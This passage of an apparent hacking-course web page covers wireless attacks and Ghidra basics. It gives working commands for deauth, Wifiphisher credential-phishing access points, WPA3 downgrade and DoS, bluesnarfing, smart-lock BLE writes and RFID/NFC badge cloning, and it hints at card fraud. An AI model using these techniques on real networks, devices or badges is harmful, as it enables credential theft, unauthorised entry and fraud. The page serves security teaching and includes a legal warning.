@@ -4519,31 +4519,3762 @@ gsutil -m cp -r gs://company-bucket/* ./downloaded/</div>
 
         <section id="advanced-wireless" class="section">
             <h2 class="section-title">Advanced Wireless Techniques</h2>
-            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
+            <p class="section-intro">Wireless networks are everywhere—invisible highways carrying data through the air. WiFi at coffee shops, Bluetooth headphones, RFID access badges, NFC payment cards, ZigBee smart home devices, 433MHz garage door openers... every wireless protocol is a potential attack vector. In Bonus B1, we covered basic WiFi hacking (aircrack-ng, airodump-ng, WPA cracking). Now we go DEEP: advanced monitoring with Kismet, social engineering attacks with Wifiphisher, WPA3 cracking, Bluetooth exploitation, RFID cloning, and radio frequency analysis. This section transforms you from WiFi script kiddie to wireless penetration expert!</p>
+
+            <div class="metaphor-box">
+                <h4>💡 Wireless Hacking = Being an Invisible Spy</h4>
+                <p>Imagine the air around you is filled with invisible conversations. Every WiFi network, Bluetooth device, and RFID card is constantly broadcasting. Traditional hackers need physical access or internet connections. Wireless hackers just need to be nearby!<br><br>
+                <strong>With the right tools, you can:</strong><br>
+                • Listen to WiFi handshakes from 100+ meters away<br>
+                • Capture Bluetooth keyboard keystrokes<br>
+                • Clone RFID access badges by walking past someone<br>
+                • Intercept car key fob signals and replay them<br>
+                • Create fake WiFi networks that look legitimate<br>
+                • Jam wireless signals to cause denial of service<br><br>
+                Wireless hacking is powerful because victims don't know they're being attacked. No cables, no physical access, no traces!</p>
+            </div>
+
+            <h3>Part 1: Kismet - Advanced WiFi/Bluetooth Detection & Monitoring</h3>
+
+            <p><strong>Kismet</strong> is a powerful wireless network detector, sniffer, and intrusion detection system. Unlike airodump-ng (which focuses on one network at a time), Kismet passively monitors ALL wireless traffic on all channels simultaneously!</p>
+
+            <div class="info-box">
+                <h4>Why Kismet > airodump-ng?</h4>
+                <p><strong>Kismet advantages:</strong><br>
+                • <strong>Channel hopping:</strong> Monitors all WiFi channels at once (airodump-ng locks to one)<br>
+                • <strong>Web interface:</strong> Beautiful real-time dashboard with graphs and maps<br>
+                • <strong>Bluetooth support:</strong> Detects BLE, BTLE, and classic Bluetooth<br>
+                • <strong>GPS integration:</strong> Maps access point locations (wardriving!)<br>
+                • <strong>Historical data:</strong> Tracks networks over time, detects patterns<br>
+                • <strong>Plugin system:</strong> Extensible with Python plugins<br>
+                • <strong>Hidden SSID detection:</strong> Reveals hidden networks via client probes<br>
+                • <strong>Rogue AP detection:</strong> Identifies evil twin attacks<br><br>
+                <strong>Use airodump-ng for:</strong> Targeted attacks on specific networks<br>
+                <strong>Use Kismet for:</strong> Passive reconnaissance, wardriving, comprehensive monitoring</p>
+            </div>
+
+            <h4>Installing Kismet</h4>
+
+            <div class="code"># Kismet comes with Kali, but here's how to update:
+sudo apt update
+sudo apt install kismet
+
+# Verify installation:
+kismet --version
+
+# Output:
+# Kismet 2024.07.01
+
+# Add your user to kismet group (avoid running as root):
+sudo usermod -aG kismet $USER
+
+# Log out and back in for group change to take effect
+
+# Start Kismet:
+kismet
+
+# Output:
+# INFO: Kismet starting...
+# INFO: Creating web server on http://localhost:2501
+# INFO: Kismet server listening on http://localhost:2501
+# 
+# Open your browser to: http://localhost:2501</div>
+
+            <h4>Kismet Web Interface Walkthrough</h4>
+
+            <div class="code"># When you open http://localhost:2501:
+
+# First-time setup:
+# 1. Create admin user and password
+# 2. Select data sources (WiFi adapters)
+
+# Main Dashboard shows:
+# • Total networks detected
+# • Total devices detected
+# • Channel distribution graph
+# • Signal strength over time
+# • Recent activity feed
+
+# Key tabs:
+
+# 1. DEVICES tab:
+# Shows all detected WiFi networks and clients
+# Columns:
+#   - Name (SSID)
+#   - Type (AP, Client, Bridge)
+#   - Channel
+#   - Encryption (WPA2, WPA3, Open)
+#   - Signal strength
+#   - First seen / Last seen
+#   - Manufacturer (from MAC OUI)
+
+# Click any device to see detailed info:
+#   - Full MAC address
+#   - Beacon frames captured
+#   - Data packets
+#   - Connected clients
+#   - GPS coordinates (if GPS enabled)
+#   - Historical signal strength graph
+
+# 2. CHANNEL USAGE:
+# Shows which channels are most crowded
+# Helps identify least-used channels for attacks
+
+# 3. DATASOURCES:
+# Manage WiFi adapters
+# Add/remove interfaces
+# See packet capture rates
+
+# 4. PLUGINS:
+# Enable/disable Kismet plugins
+# Install new plugins
+
+# 5. ALERTS:
+# Security alerts:
+#   - Rogue AP detected
+#   - Deauth flood detected
+#   - GPS spoofing detected
+#   - Bluetooth scanning attacks</div>
+
+            <h4>Kismet Command-Line Usage</h4>
+
+            <div class="code"># Start Kismet with specific adapter:
+kismet -c wlan0
+
+# Start with multiple adapters:
+kismet -c wlan0 -c wlan1
+
+# Enable GPS:
+kismet -c wlan0 --use-gpsd
+
+# Specify output directory:
+kismet -c wlan0 --log-prefix /root/kismet-logs/
+
+# Run in quiet mode (no web interface):
+kismet -c wlan0 --no-ncurses --no-webui
+
+# Capture only specific channels:
+kismet -c wlan0:channels="1,6,11"
+
+# Capture 5GHz only:
+kismet -c wlan0:channels="36,40,44,48"
+
+# Set GPS location manually (no GPS device):
+kismet -c wlan0 --override-gps-lat 40.7128 --override-gps-lon -74.0060
+
+# Enable Bluetooth:
+kismet -c hci0:name=bluetooth
+
+# All wireless protocols at once:
+kismet -c wlan0 -c hci0</div>
+
+            <h4>Wardriving with Kismet</h4>
+
+            <div class="code"># Wardriving = driving around mapping WiFi networks
+
+# Hardware needed:
+# • Laptop with Kali
+# • High-gain WiFi adapter (Alfa AWUS036ACH recommended)
+# • GPS dongle (GlobalSat BU-353 or phone GPS via Bluetooth)
+# • Car power inverter or large battery pack
+
+# Setup GPS:
+# Install gpsd:
+sudo apt install gpsd gpsd-clients
+
+# Connect GPS dongle, then:
+sudo gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock
+
+# Verify GPS:
+cgps
+
+# You should see satellites and coordinates
+
+# Start Kismet with GPS:
+kismet -c wlan0 --use-gpsd
+
+# Drive around for hours!
+# Kismet logs everything to: ~/.kismet/logs/
+
+# After wardriving session:
+# Kismet creates files:
+#   - Kismet-YYYYMMDD-HH-MM-SS-1.kismet (database)
+#   - Kismet-YYYYMMDD-HH-MM-SS-1.pcapng (packet capture)
+#   - Kismet-YYYYMMDD-HH-MM-SS-1.log (text log)
+
+# Convert Kismet logs to KML (Google Earth):
+kismetdb_to_kml --in Kismet-20260108-10-00-00-1.kismet --out networks.kml
+
+# Open in Google Earth to see all networks on map!
+
+# Export to CSV for analysis:
+kismetdb_to_csv --in Kismet-20260108-10-00-00-1.kismet --out networks.csv
+
+# Analyze CSV with Python/Excel:
+# Find most common SSIDs, weakest encryption, high-value targets</div>
+
+            <h4>Detecting Hidden SSIDs with Kismet</h4>
+
+            <div class="code"># Many networks hide their SSID (not broadcast in beacons)
+# But clients constantly probe for known networks!
+
+# In Kismet web interface:
+# 1. Look for networks with SSID: "<Hidden SSID>"
+# 2. Click the network
+# 3. Go to "Client Devices" tab
+# 4. Watch for probe requests
+
+# Clients send: "Is [NetworkName] here? Is [NetworkName] here?"
+# Kismet captures these probes and reveals the SSID!
+
+# Example:
+# Hidden network at MAC: AA:BB:CC:DD:EE:FF
+# Client probes: "Is HomeNetwork here?"
+# → Kismet updates: AA:BB:CC:DD:EE:FF = "HomeNetwork"
+
+# Force faster revelation:
+# Deauth clients from the hidden network
+# They'll immediately probe to reconnect!
+
+aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Within seconds, Kismet reveals the hidden SSID</div>
+
+            <h3>Part 2: Fern WiFi Cracker - GUI-Based WiFi Hacking</h3>
+
+            <p><strong>Fern WiFi Cracker</strong> is a graphical tool that automates WiFi security testing. It's essentially a GUI wrapper around aircrack-ng suite, making attacks point-and-click easy!</p>
+
+            <div class="code"># Install Fern:
+sudo apt install fern-wifi-cracker
+
+# Or from GitHub:
+git clone https://github.com/savio-code/fern-wifi-cracker.git
+cd fern-wifi-cracker
+sudo python3 execute.py
+
+# Launch Fern:
+sudo fern-wifi-cracker
+
+# Main interface:
+# 1. Select WiFi interface (wlan0)
+# 2. Click "Scan for Access Points"
+# 3. Choose WEP or WPA/WPA2 tab
+# 4. Select target network
+# 5. Click attack type:
+#    - WEP: Fake authentication, ARP replay, caffe-latte
+#    - WPA: Handshake capture, deauth attack
+# 6. Provide wordlist for cracking
+# 7. Click "WiFi Attack"
+
+# Fern automatically:
+# ✅ Enables monitor mode
+# ✅ Captures handshake
+# ✅ Deauths clients
+# ✅ Cracks password
+# ✅ Displays results
+
+# Features:
+# • Automatic attack selection (best for each encryption)
+# • Built-in wordlist manager
+# • Session management (resume attacks)
+# • Ethernet attacks (ARP spoofing, DNS spoofing)
+# • Credential harvester (fake login pages)
+
+# Limitations:
+# • Not as flexible as manual aircrack-ng
+# • Slower than command-line tools
+# • Less control over parameters
+
+# Best use: Quick audits, demos, teaching beginners</div>
+
+            <h3>Part 3: Wifiphisher - Social Engineering WiFi Attacks</h3>
+
+            <p><strong>Wifiphisher</strong> is a rogue access point framework for automated phishing attacks against WiFi users. It creates fake access points, jams the real network, and serves credential-stealing web pages!</p>
+
+            <div class="metaphor-box">
+                <h4>💡 Wifiphisher = The WiFi Con Artist</h4>
+                <p>Imagine you're at a coffee shop. The WiFi is "CoffeeShop_Guest". Suddenly:<br><br>
+                1. Your connection drops (Wifiphisher jamming real AP)<br>
+                2. You see "CoffeeShop_Guest" again, connect<br>
+                3. Browser opens: "Firmware Update Required - Enter WiFi Password to Continue"<br>
+                4. You type your password...<br>
+                5. Attacker now has the WPA password!<br><br>
+                Wifiphisher automates this entire attack: jam → fake AP → phishing page → capture credentials!</p>
+            </div>
+
+            <div class="code"># Install Wifiphisher:
+sudo apt install wifiphisher
+
+# Or from GitHub:
+git clone https://github.com/wifiphisher/wifiphisher.git
+cd wifiphisher
+sudo python3 setup.py install
+
+# Basic attack (automated):
+sudo wifiphisher
+
+# Wifiphisher will:
+# 1. Scan for networks
+# 2. Display list of APs
+# 3. You select target
+# 4. Wifiphisher jams target AP
+# 5. Creates fake AP with same SSID
+# 6. Serves phishing page
+
+# Manual mode (more control):
+sudo wifiphisher -aI wlan0 -jI wlan1 -e "TargetNetwork"
+
+# -aI wlan0    → Access point interface (creates fake AP)
+# -jI wlan1    → Jamming interface (deauths real AP)
+# -e "TargetNetwork" → Target SSID
+
+# Built-in phishing scenarios:
+
+# 1. Firmware Upgrade (most believable):
+sudo wifiphisher -aI wlan0 -jI wlan1 -e "TargetNetwork" -p firmware-upgrade
+
+# Page says: "Router firmware update required. Enter WiFi password to continue."
+
+# 2. Browser Plugin Update:
+sudo wifiphisher -p plugin_update
+
+# Page says: "Browser plugin outdated. Install update to continue."
+# Downloads malware!
+
+# 3. OAuth Login:
+sudo wifiphisher -p oauth-login
+
+# Fake Google/Facebook login page
+
+# 4. Network Manager Connect:
+sudo wifiphisher -p network_manager_connect
+
+# Looks like Linux network manager asking for password
+
+# Custom phishing pages:
+# Create HTML page: /etc/wifiphisher/phishing-pages/custom/
+sudo mkdir -p /etc/wifiphisher/phishing-pages/custom-page/
+sudo nano /etc/wifiphisher/phishing-pages/custom-page/index.html
+
+# Use this template:
+# <!DOCTYPE html>
+# <html>
+# <body>
+#   <h1>IT Department Notice</h1>
+#   <p>Your access credentials have expired.</p>
+#   <form method="POST" action="/phishing/password">
+#     <input type="password" name="password" placeholder="WiFi Password">
+#     <button type="submit">Verify</button>
+#   </form>
+# </body>
+# </html>
+
+# Use custom page:
+sudo wifiphisher -p custom-page
+
+# Captured credentials saved to:
+# /root/wifiphisher-credentials.txt
+
+# Check results:
+cat /root/wifiphisher-credentials.txt
+
+# Output:
+# [2026-01-08 14:30:22] Password: MySecretWiFi123
+# [2026-01-08 14:32:15] Password: CompanyWiFi2026</div>
+
+            <h4>Advanced Wifiphisher Techniques</h4>
+
+            <div class="code"># Evil Twin + Captive Portal (no jamming):
+sudo wifiphisher --nojoammer -e "FreeWiFi" -p firmware-upgrade
+
+# Creates open "FreeWiFi" network
+# When users connect, captive portal asks for "verification"
+# Perfect for conferences, airports, hotels
+
+# HTTPS phishing (SSL strip):
+sudo wifiphisher --sslstrip
+
+# Strips HTTPS from websites
+# Shows padlock but serves HTTP
+# Captures passwords from HTTPS sites!
+
+# Known beacons attack:
+sudo wifiphisher --knownbeacons
+
+# Creates multiple fake APs with common SSIDs:
+# - "Free WiFi"
+# - "Airport WiFi"
+# - "Starbucks"
+# - "Hotel Guest"
+# Devices auto-connect if they've seen these before!
+
+# Handshake capture mode:
+sudo wifiphisher --handshake
+
+# Captures WPA handshakes instead of phishing
+# Good for cracking passwords offline later
+
+# Logging and verbosity:
+sudo wifiphisher -v -l /tmp/wifiphisher.log
+
+# -v = verbose output
+# -l = log file location</div>
+
+            <div class="warning-box">
+                <h4>⚠️ Wifiphisher Legal Warning</h4>
+                <p><strong>CRITICAL:</strong> Wifiphisher creates rogue access points and harvests credentials. This is ILLEGAL without authorization!<br><br>
+                <strong>Authorized use cases ONLY:</strong><br>
+                • Pentesting engagements with written permission<br>
+                • Red team exercises on company networks<br>
+                • Security awareness training (with user consent)<br>
+                • Personal lab networks<br><br>
+                <strong>NEVER use on public networks, coffee shops, airports, or any network you don't own/have permission to test!</strong><br><br>
+                Penalties can include:<br>
+                • Computer fraud charges<br>
+                • Identity theft charges<br>
+                • Wire fraud charges<br>
+                • 10+ years prison in many jurisdictions<br><br>
+                Use responsibly. You've been warned! 🚨</p>
+            </div>
+
+            <h3>Part 4: WPA3 Security & Attacks</h3>
+
+            <p><strong>WPA3</strong> is the latest WiFi security standard (2018+), designed to fix WPA2 weaknesses. But it's not invulnerable!</p>
+
+            <h4>WPA3 Improvements Over WPA2</h4>
+
+            <div class="info-box">
+                <h4>What Makes WPA3 Better?</h4>
+                <p><strong>1. SAE (Simultaneous Authentication of Equals):</strong><br>
+                Replaces WPA2's 4-way handshake with Dragonfly key exchange<br>
+                • Protects against offline dictionary attacks<br>
+                • Forward secrecy (past traffic stays encrypted even if password compromised)<br><br>
+                <strong>2. Protection Against Deauth Attacks:</strong><br>
+                Management frame protection (802.11w) mandatory<br>
+                • Deauth frames must be encrypted and authenticated<br>
+                • Can't use aireplay-ng --deauth anymore!<br><br>
+                <strong>3. Individualized Data Encryption:</strong><br>
+                Each device gets unique encryption key<br>
+                • In WPA2, all devices share group key<br>
+                • In WPA3, sniffing one device doesn't reveal others<br><br>
+                <strong>4. Easy Connect (WPA3-Easy):</strong><br>
+                QR code pairing for IoT devices<br>
+                • No more "12345678" default passwords<br><br>
+                <strong>5. 192-bit Security Suite:</strong><br>
+                Optional enterprise mode with stronger crypto<br>
+                • GCMP-256 encryption<br>
+                • BIP-GMAC-256 management frame protection</p>
+            </div>
+
+            <h4>WPA3 Vulnerabilities - Dragonblood Attacks</h4>
+
+            <div class="code"># WPA3 has known vulnerabilities discovered in 2019-2020:
+# "Dragonblood" attacks by Mathy Vanhoef
+
+# Vulnerability categories:
+
+# 1. Timing-based side-channel attack
+# Attacker can recover password by measuring how long authentication takes
+# Requires being very close to AP (same room)
+# Exploits: Some WPA3 implementations leak password info via timing
+
+# 2. Downgrade attack
+# Force WPA3 AP to use WPA2 "transition mode"
+# Then attack with traditional WPA2 methods!
+
+# Detection:
+airodump-ng wlan0mon
+
+# Look for "WPA2 WPA3" in ENC column = vulnerable to downgrade!
+
+# Attack:
+# Use wpa_supplicant to force WPA2 connection:
+wpa_supplicant -i wlan0 -c wpa2_only.conf
+
+# wpa2_only.conf:
+# network={
+#   ssid="TargetNetwork"
+#   key_mgmt=WPA-PSK
+#   psk="test"
+# }
+
+# 3. Denial of Service
+# Send invalid SAE frames to crash AP
+# Tool: Dragonblood PoC scripts
+
+git clone https://github.com/vanhoefm/dragonslayer.git
+cd dragonslayer
+
+# Run DoS attack:
+./dragonslayer.py wlan0 --target AA:BB:CC:DD:EE:FF --dos
+
+# 4. Cache-based side-channel (CVE-2019-9494)
+# Recover password via CPU cache timing
+# Highly complex, mostly theoretical
+
+# Current state of WPA3 attacks:
+# ❌ Can't capture handshake and crack offline (main win for WPA3!)
+# ✅ Can downgrade to WPA2 on some APs
+# ✅ Can DoS the network
+# ⚠️ Side-channel attacks possible but difficult
+
+# Best attack vector: Social engineering (Wifiphisher!)
+# WPA3 doesn't stop users from typing password into fake portal!</div>
+
+            <h3>Part 5: Bluetooth Exploitation</h3>
+
+            <h4>Bluetooth Basics for Hackers</h4>
+
+            <div class="code"># Bluetooth has two main versions:
+# • Bluetooth Classic (BR/EDR) - keyboards, headsets, file transfer
+# • Bluetooth Low Energy (BLE/BTLE) - fitness trackers, IoT devices
+
+# Install Bluetooth tools:
+sudo apt install bluez bluez-tools
+
+# List Bluetooth adapters:
+hciconfig
+
+# Output:
+# hci0:   Type: Primary  Bus: USB
+#         BD Address: 00:11:22:33:44:55  ACL MTU: 1021:8  SCO MTU: 64:1
+#         UP RUNNING
+#         RX bytes:1234 acl:10 sco:0 events:56 errors:0
+#         TX bytes:5678 acl:10 sco:0 commands:45 errors:0
+
+# Enable Bluetooth adapter:
+sudo hciconfig hci0 up
+
+# Scan for nearby Bluetooth devices:
+sudo hcitool scan
+
+# Output:
+# Scanning ...
+#     AA:BB:CC:DD:EE:FF       John's iPhone
+#     11:22:33:44:55:66       Bose Headphones
+#     77:88:99:AA:BB:CC       Samsung Galaxy
+
+# Get detailed device info:
+sudo hcitool info AA:BB:CC:DD:EE:FF
+
+# Output:
+# Requesting information ...
+#     BD Address:  AA:BB:CC:DD:EE:FF
+#     Device Name: John's iPhone
+#     LMP Version: 5.0 (0x9) LMP Subversion: 0x4321
+#     Manufacturer: Apple (76)
+
+# BLE scan:
+sudo hcitool lescan
+
+# Output:
+# LE Scan ...
+# AA:BB:CC:DD:EE:FF Fitbit Charge 5
+# 11:22:33:44:55:66 (unknown)
+# 77:88:99:AA:BB:CC Mi Band 6</div>
+
+            <h4>Bluetooth Attacks with Bluepot & Redfang</h4>
+
+            <div class="code"># Redfang - Find hidden Bluetooth devices
+# (Devices in "non-discoverable" mode)
+
+git clone https://github.com/mister-espria/redfang.git
+cd redfang
+./redfang
+
+# Brute-forces MAC addresses to find hidden devices
+# Useful for finding devices that don't respond to hcitool scan
+
+# Bluepot - Bluetooth honeypot
+# Simulates vulnerable Bluetooth device to catch attackers
+
+git clone https://github.com/andrewmichaelsmith/bluepot.git
+cd bluepot
+sudo python bluepot.py
+
+# Creates fake vulnerable device
+# Logs connection attempts
+# Identifies attacking tools
+
+# Bluesnarfing - Steal data from device
+# (Works on old devices with OBEX vulnerabilities)
+
+sudo apt install obexftp
+
+# Connect and list files:
+obexftp -b AA:BB:CC:DD:EE:FF -l
+
+# Download contacts:
+obexftp -b AA:BB:CC:DD:EE:FF -g telecom/pb.vcf
+
+# Download calendar:
+obexftp -b AA:BB:CC:DD:EE:FF -g telecom/cal.vcs
+
+# Bluejacking - Send unsolicited messages
+# (Harmless but annoying)
+
+ussp-push AA:BB:CC:DD:EE:FF@10 message.txt message.txt
+
+# Sends message.txt to device
+# User sees: "Incoming file: message.txt"</div>
+
+            <h4>BLE Hacking with Gatttool & BLESuite</h4>
+
+            <div class="code"># BLE uses GATT (Generic Attribute Profile)
+# Devices expose "services" with "characteristics" (data fields)
+
+# Connect to BLE device:
+gatttool -b AA:BB:CC:DD:EE:FF -I
+
+# Interactive mode:
+[AA:BB:CC:DD:EE:FF][LE]> connect
+Attempting to connect to AA:BB:CC:DD:EE:FF
+Connection successful
+
+# List services:
+[AA:BB:CC:DD:EE:FF][LE]> primary
+attr handle: 0x0001, end grp handle: 0x0007 uuid: 00001800-0000-1000-8000-00805f9b34fb
+attr handle: 0x0008, end grp handle: 0x000b uuid: 00001801-0000-1000-8000-00805f9b34fb
+attr handle: 0x000c, end grp handle: 0xffff uuid: 0000180f-0000-1000-8000-00805f9b34fb
+
+# List characteristics:
+[AA:BB:CC:DD:EE:FF][LE]> characteristics
+handle: 0x0002, char properties: 0x02, char value handle: 0x0003, uuid: 00002a00-0000-1000-8000-00805f9b34fb
+handle: 0x0004, char properties: 0x02, char value handle: 0x0005, uuid: 00002a01-0000-1000-8000-00805f9b34fb
+
+# Read characteristic:
+[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0003
+Characteristic value/descriptor: 46 69 74 62 69 74 20 43 68 61 72 67 65
+
+# (Hex decodes to: "Fitbit Charge")
+
+# Write to characteristic:
+[AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x0010 01
+
+# Might trigger action (turn on LED, change setting, etc.)
+
+# BLESuite - More advanced BLE exploitation:
+git clone https://github.com/nccgroup/BLESuite.git
+cd BLESuite
+sudo python3 setup.py install
+
+# Scan and identify BLE devices:
+ble-scan
+
+# Enumerate GATT services:
+ble-read -a AA:BB:CC:DD:EE:FF
+
+# Smart lock exploit example:
+# Many smart locks have "unlock" characteristic
+# Find it, write 0x01, door unlocks!
+
+# Fitness tracker exploit:
+# Read heart rate, steps, location history
+# Privacy nightmare!</div>
+
+            <h3>Part 6: RFID/NFC Hacking</h3>
+
+            <h4>Understanding RFID & NFC</h4>
+
+            <div class="info-box">
+                <h4>RFID vs NFC</h4>
+                <p><strong>RFID (Radio Frequency Identification):</strong><br>
+                • Long range (up to 100 meters for active tags)<br>
+                • Used for: Access badges, inventory tracking, toll collection<br>
+                • Frequencies: 125kHz (low), 13.56MHz (high), 900MHz (ultra-high)<br><br>
+                <strong>NFC (Near Field Communication):</strong><br>
+                • Short range (< 10cm)<br>
+                • Based on 13.56MHz RFID<br>
+                • Used for: Contactless payments, phone pairing, smart posters<br>
+                • Two-way communication (RFID is usually one-way)<br><br>
+                <strong>Why they're vulnerable:</strong><br>
+                • No encryption on basic tags (125kHz)<br>
+                • Easily cloned with $20 device<br>
+                • Can be read from distance (RFID)<br>
+                • Replay attacks possible</p>
+            </div>
+
+            <h4>RFID Cloning with Proxmark3</h4>
+
+            <div class="code"># Proxmark3 - Professional RFID research tool (~$300)
+# Can read, clone, and emulate RFID/NFC tags
+
+# Budget alternative: ACR122U NFC reader (~$40)
+
+# Reading 125kHz RFID card (HID Prox):
+proxmark3> lf hid fskdemod
+
+# Output:
+# TAG ID: 2004e11e (printed on card)
+# Full: 10004e11e (with site code)
+
+# Clone to writable T5577 card:
+proxmark3> lf hid clone 2004e11e
+
+# Output:
+# Cloning tag to T5577
+# Writing block 0
+# Writing block 1
+# Done!
+
+# The cloned card now works as the original!
+
+# Reading 13.56MHz RFID/NFC (Mifare Classic):
+proxmark3> hf mf chk *1 ?
+
+# Output:
+# Checking keys...
+# Sector 0: Key A: FFFFFFFFFFFF (default key found!)
+# Sector 1: Key A: FFFFFFFFFFFF
+# [most keys are still factory default!]
+
+# Dump entire card:
+proxmark3> hf mf dump
+
+# Creates: dumpdata.bin
+
+# Clone to blank Mifare card:
+proxmark3> hf mf restore
+
+# Write dumpdata.bin to new card
+# Perfect clone!
+
+# NFC credit card reading:
+proxmark3> hf 14a reader
+
+# Output:
+# UID: 01 02 03 04
+# ATQA: 00 04
+# SAK: 08 [Mifare Classic]
+
+# Some credit cards expose:
+# • Card number (PAN)
+# • Expiry date
+# • Cardholder name
+# • Recent transaction history
+
+# Note: Can't withdraw money (CVV not on chip)
+# But: Can use for online fraud if no 2FA!</div>
+
+            <h4>Budget RFID Hacking - ACR122U</h4>
+
+            <div class="code"># ACR122U is USB NFC reader/writer (~$40)
+# Works with libnfc
+
+# Install libnfc:
+sudo apt install libnfc-bin libnfc-examples
+
+# List readers:
+nfc-list
+
+# Output:
+# NFC device: ACS ACR122U opened
+
+# Scan for tags:
+nfc-poll
+
+# Output when card near:
+# NFC target found:
+#     UID: 01 02 03 04
+#     ATQA: 00 04
+#     SAK: 08
+
+# Read Mifare Classic card:
+nfc-mfclassic r a dump.mfd
+
+# Requires: Mifare Classic card
+# Output: dump.mfd (full card data)
+
+# Write to blank card:
+nfc-mfclassic w a dump.mfd
+
+# Clone complete!
+
+# Emulate tag (turn ACR122U into virtual card):
+nfc-emulate-tag
+
+# Your reader now pretends to be a tag
+# Can simulate access badge without carrying it!
+
+# Android phone NFC hacking:
+# Install: "NFC Tools" app (free)
+# Can read/write NFC tags
+# Limited compared to Proxmark3, but portable!</div>
+
+            <div class="metaphor-box">
+                <h4>🎉 You're a Wireless Penetration Master!</h4>
+                <p>You've conquered:<br><br>
+                ✅ <strong>Kismet:</strong> Advanced WiFi monitoring, wardriving, hidden SSID detection<br>
+                ✅ <strong>Fern WiFi Cracker:</strong> GUI-based automated WiFi attacks<br>
+                ✅ <strong>Wifiphisher:</strong> Rogue AP + social engineering credential theft<br>
+                ✅ <strong>WPA3:</strong> Understanding improvements, Dragonblood attacks, limitations<br>
+                ✅ <strong>Bluetooth:</strong> Classic & BLE hacking, GATT enumeration, smart device exploits<br>
+                ✅ <strong>RFID/NFC:</strong> Proxmark3 cloning, access badge duplication, credit card reading<br><br>
+                <strong>Wireless Attack Surface:</strong><br>
+                • <strong>WiFi:</strong> WPA2 handshakes, WPA3 downgrades, evil twin APs<br>
+                • <strong>Bluetooth:</strong> BLE smart locks, fitness trackers, car key fobs<br>
+                • <strong>RFID:</strong> 125kHz access badges, 13.56MHz transit cards<br>
+                • <strong>NFC:</strong> Contactless payment cards, phone pairing<br>
+                • <strong>433MHz:</strong> Garage doors, car remotes, weather stations (SDR topic)<br>
+                • <strong>ZigBee:</strong> Smart home devices (requires KillerBee tools)<br><br>
+                <strong>Defense strategies:</strong><br>
+                • Use WPA3 with strong passwords (16+ chars)<br>
+                • Disable WPS, disable WPA2 transition mode<br>
+                • Enable 802.11w (management frame protection)<br>
+                • Use wired connections for critical systems<br>
+                • Shield RFID badges (Faraday sleeves)<br>
+                • Monitor for rogue APs (Kismet!)<br><br>
+                Wireless hacking is one of the most exciting pentesting domains because it's invisible, long-range, and often underestimated by defenders. Companies spend millions on firewalls but leave WiFi wide open! 📡🔓</p>
+            </div>
         </section>
 
         <!-- SECTION 6: Reverse Engineering Mastery -->
         <section id="reverse-engineering" class="section">
             <h2 class="section-title">Reverse Engineering Mastery</h2>
-            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
+            <p class="section-intro">Reverse engineering is digital archaeology. Someone gave you a compiled binary—machine code that CPUs understand but humans can't read. Your mission: understand what it does, find vulnerabilities, bypass protections, extract secrets. Whether you're analyzing malware, cracking software, finding 0-days, or understanding proprietary protocols, reverse engineering is THE skill that separates script kiddies from elite hackers. This section covers Ghidra (NSA's free RE tool), radare2 (command-line beast), Binary Ninja (modern platform), GDB debugging, ELF analysis (Linux), and PE analysis (Windows). By the end, you'll read assembly like English!</p>
+
+            <div class="metaphor-box">
+                <h4>💡 Reverse Engineering = Reading Someone's Mind</h4>
+                <p>Imagine someone hands you a locked box with no documentation. Inside are gears, circuits, and mechanisms. Your job:<br><br>
+                1. <strong>Static analysis:</strong> Take it apart without turning it on (disassembly)<br>
+                2. <strong>Dynamic analysis:</strong> Run it and observe behavior (debugging)<br>
+                3. <strong>Decompilation:</strong> Reconstruct the original blueprints (C code from assembly)<br><br>
+                <strong>Why reverse engineer?</strong><br>
+                • <strong>Security:</strong> Find vulns in closed-source software<br>
+                • <strong>Malware analysis:</strong> Understand what virus does<br>
+                • <strong>Cracking:</strong> Bypass license checks, DRM<br>
+                • <strong>Interoperability:</strong> Make different systems work together<br>
+                • <strong>Learning:</strong> See how experts write optimized code<br>
+                • <strong>Protocol reverse engineering:</strong> Understand proprietary network protocols<br><br>
+                Every binary tells a story. Your job is to read it! 📖🔍</p>
+            </div>
+
+            <h3>Part 1: Ghidra - NSA's Reverse Engineering Framework</h3>
+
+            <p><strong>Ghidra</strong> (pronounced "GEE-druh") is a FREE, open-source software reverse engineering suite developed by the NSA and released publicly in 2019. It rivals $10,000+ commercial tools like IDA Pro!</p>
+
+            <h4>Installing & Launching Ghidra</h4>
+
+            <div class="code"># Ghidra requires Java JDK 11+
+sudo apt update
+sudo apt install openjdk-17-jdk
+
+# Download Ghidra from:
+# https://ghidra-sre.org/
+
+# Or install via Kali repo:
+sudo apt install ghidra
+
+# Launch Ghidra:
+ghidra
+
+# First launch creates:
+# ~/.ghidra/ (settings and projects)
+
+# Create new project:
+# File → New Project → Non-Shared Project
+# Name: MyReverseEngineering
+# Location: /root/ghidra_projects/
+
+# Import binary:
+# File → Import File → Select binary (e.g., /bin/ls)
+# Ghidra auto-detects:
+#   - Format: ELF, PE, Mach-O, etc.
+#   - Architecture: x86, x64, ARM, MIPS, etc.
+#   - Endianness: Little, Big
+# Click OK
+
+# Analyze binary:
+# Analysis → Auto Analyze
+# Check all options:
+#   ✅ Decompiler Parameter ID
+#   ✅ Function Start Search
+#   ✅ Stack
+#   ✅ Reference
+#   ✅ Embedded Media
+#   ✅ Create Address Tables
+#   ✅ ASCII Strings
+# Click Analyze (takes 30 seconds to few minutes)
+
+# Ghidra now shows:
+# • All functions (left panel)
+# • Disassembly (middle panel)
+# • Decompiled C code (right panel)</div>
+
+            <h4>Ghidra Interface Walkthrough</h4>
+
+            <div class="code"># Main Ghidra window sections:
+
+# 1. Program Trees (left)
+# Shows binary structure:
+#   - .text (code)
+#   - .data (initialized data)
+#   - .rodata (read-only data like strings)
+#   - .bss (uninitialized data)
+
+# 2. Symbol Tree (left, different tab)
+# Lists all functions:
+#   - Functions
+#   - Labels
+#   - Classes (C++ binaries)
+#   - Namespaces
+
+# 3. Listing (center)
+# Disassembly view:
+# Address | Bytes | Mnemonic | Operands
+# 00401000 | 55 | PUSH | EBP
+# 00401001 | 89 e5 | MOV | EBP, ESP
+# 00401003 | 83 ec 10 | SUB | ESP, 0x10
+
+# 4. Decompiler (right)
+# Pseudo-C code:
+# void main(void) {
+#   int local_10;
+#   local_10 = 0;
+#   printf("Hello World\n");
